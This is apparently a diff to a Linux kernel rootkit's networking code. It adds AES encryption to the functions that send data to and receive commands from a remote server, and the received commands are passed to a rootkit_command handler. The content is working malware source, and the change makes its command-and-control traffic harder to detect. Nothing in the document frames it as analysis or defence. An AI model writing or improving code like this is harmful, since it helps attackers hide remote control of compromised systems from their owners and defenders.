@@ -46,62 +46,63 @@ int close_socket(void) {
  *         their meanings should be documented in the implementation.
  */
 int send_to_server(char *message, ...) {
-    struct kvec vec = { 0 };
-    struct msghdr msg = { 0 };
-    int ret_code = 0;
+    struct kvec vec;
+    struct msghdr msg;
+    int ret_code;
     va_list args;
     char *formatted_message;
-    bool truncated = false;
+    char *encrypted_msg = NULL;
+    size_t encrypted_len;
+    int written;
 
+    if (!sock)
+        return -EINVAL;
+
+    // Retrieve all formatted message
     formatted_message = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!formatted_message) {
-        ERR_MSG("send_to_server: memory allocation failed\n");
+    if (!formatted_message)
         return -ENOMEM;
-    }
 
-    if (!sock) {
-        ERR_MSG("send_to_server: socket is NULL\n");
-        kfree(formatted_message);
-        return -FAILURE;
-    }
-
-    // Format the message with additional arguments
     va_start(args, message);
-    int written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
-
-    if (written < 0) {
-        ERR_MSG("send_to_server: vsnprintf failed\n");
-        kfree(formatted_message);
-        va_end(args);
-        return -FAILURE;
-    }
-
+    written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
     va_end(args);
 
-    // Check if the message was truncated
-    if (strlen(message) >= STD_BUFFER_SIZE) {
-        truncated = true;
-        strncat(formatted_message, " (truncated msg)", STD_BUFFER_SIZE - strlen(formatted_message) - 1);
-    }
-
-    vec.iov_base = formatted_message;
-    vec.iov_len = strlen(formatted_message);
-
-    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-    if (ret_code < 0) {
-        ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
+    if (written < 0) {
         kfree(formatted_message);
-        return -FAILURE;
+        return -EIO;
     }
 
+    // Detect truncation
+    // Duno know if it still useful but it is here
+    if (written >= STD_BUFFER_SIZE)
+        pr_warn("send_to_server: message truncated\n");
+
+    // Cipherer message using AES
+    ret_code = encrypt_buffer(formatted_message, strlen(formatted_message), &encrypted_msg, &encrypted_len);
     kfree(formatted_message);
 
-    return SUCCESS;
+    if (ret_code < 0) {
+        ERR_MSG("send_to_server: encryption failed\n");
+        return ret_code;
+    }
+
+    // Prepare sending
+    vec.iov_base = encrypted_msg;
+    vec.iov_len = encrypted_len;
+    memset(&msg, 0, sizeof(msg));
+    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+
+    kfree(encrypted_msg);
+
+    return ret_code < 0 ? ret_code : SUCCESS;
 }
 
 int receive_from_server(char *recv_buffer, int buffer_size) {
     struct kvec vec;
     struct msghdr msg = { 0 };
+    char *encrypted_buf = NULL;
+    char *decrypted_buf = NULL;
+    size_t decrypted_len;
     int ret;
 
     if (!recv_buffer) {
@@ -109,16 +110,41 @@ int receive_from_server(char *recv_buffer, int buffer_size) {
         return -EINVAL;
     }
 
-    vec.iov_base = recv_buffer;
+    // memo: kzalloc == calloc
+    encrypted_buf = kzalloc(buffer_size, GFP_KERNEL);
+    if (!encrypted_buf)
+        return -ENOMEM;
+
+    // Receive the message
+    vec.iov_base = encrypted_buf;
     vec.iov_len = buffer_size;
 
     ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
     if (ret < 0) {
         ERR_MSG("receive_from_server: kernel_recvmsg failed: %d\n", ret);
+        kfree(encrypted_buf);
         return FAILURE;
     }
 
-    recv_buffer[ret] = '\0';
+    // Uncipherer message using AES
+    if (decrypt_buffer(encrypted_buf, ret, &decrypted_buf, &decrypted_len) < 0) {
+        ERR_MSG("receive_from_server: decryption failed\n");
+        kfree(encrypted_buf);
+        return FAILURE;
+    }
+
+    // Prevent buffer overflow
+    // Duno know how this can fix problems without creating others but it does
+    if (decrypted_len >= buffer_size)
+        decrypted_len = buffer_size - 1;
+
+    // Copy decrypted message to recv_buffer
+    memcpy(recv_buffer, decrypted_buf, decrypted_len);
+    recv_buffer[decrypted_len] = '\0';
+
+    kfree(encrypted_buf);
+    kfree(decrypted_buf);
+
     return SUCCESS;
 }
 
@@ -276,9 +302,9 @@ int network_worker(void *data) {
             rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
     }
 
-	// autodisconnect user when connexion is terminated
-	is_auth = false;
-	DBG_MSG("network_worker: connexion terminated, user disconnected\n");
+    // autodisconnect user when connexion is terminated
+    is_auth = false;
+    DBG_MSG("network_worker: connexion terminated, user disconnected\n");
 
     kfree(recv_buffer);
     recv_buffer = NULL;
